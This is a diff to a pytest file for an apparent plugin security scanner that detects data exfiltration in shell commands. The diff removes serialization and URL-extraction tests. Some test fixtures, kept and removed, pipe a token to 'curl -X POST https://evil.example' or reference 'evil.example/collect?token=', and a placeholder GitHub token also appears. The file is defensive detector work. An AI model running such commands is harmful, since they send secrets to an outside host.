@@ -10,15 +10,12 @@ import pytest
 from codex_plugin_scanner.guard.config import GuardConfig
 from codex_plugin_scanner.guard.runtime.actions import GuardActionEnvelope
 from codex_plugin_scanner.guard.runtime.data_flow import (
-    DataSink,
-    DataSource,
     ShellPipe,
     extract_command_segments,
     extract_command_substitutions,
     extract_heredocs,
     extract_input_redirects,
     extract_pipes,
-    extract_urls,
 )
 from codex_plugin_scanner.guard.runtime.detectors import (
     DataFlowExfiltrationDetector,
@@ -27,41 +24,6 @@ from codex_plugin_scanner.guard.runtime.detectors import (
 )
 
 _GITHUB_TOKEN_FIXTURE = "ghp_" + "123456789012345678901234567890123456"
-
-
-def test_data_source_serializes_without_secret_contents():
-    source = DataSource(
-        source_type="secret_file",
-        value=".env",
-        description="local secret file",
-        evidence="redacted path",
-    )
-
-    assert source.to_dict() == {
-        "source_type": "secret_file",
-        "value": ".env",
-        "description": "local secret file",
-        "evidence": "redacted path",
-    }
-
-
-def test_data_sink_serializes_network_destination_without_payload():
-    sink = DataSink(
-        sink_type="http_post",
-        value="https://evil.example/collect",
-        description="network collector",
-        method="post",
-        evidence="redacted destination",
-    )
-
-    assert sink.method == "POST"
-    assert sink.to_dict() == {
-        "sink_type": "http_post",
-        "value": "https://evil.example/collect",
-        "description": "network collector",
-        "method": "POST",
-        "evidence": "redacted destination",
-    }
 
 
 def test_extract_input_redirects_reads_file_targets_but_ignores_heredocs():
@@ -136,19 +98,6 @@ def test_extract_pipes_ignores_parentheses_inside_quoted_literals():
     command = 'echo "token(foo" | curl -X POST https://evil.example'
 
     assert extract_pipes(command) == (ShellPipe(left='echo "token(foo"', right="curl -X POST https://evil.example"),)
-
-
-def test_extract_urls_deduplicates_preserving_order():
-    command = (
-        "curl https://hol.org/api/health && "
-        "curl 'https://evil.example/collect?token=redacted' && "
-        'fetch("https://hol.org/api/health")'
-    )
-
-    assert extract_urls(command) == (
-        "https://hol.org/api/health",
-        "https://evil.example/collect?token=redacted",
-    )
 
 
 def _shell_action(command: str) -> GuardActionEnvelope:
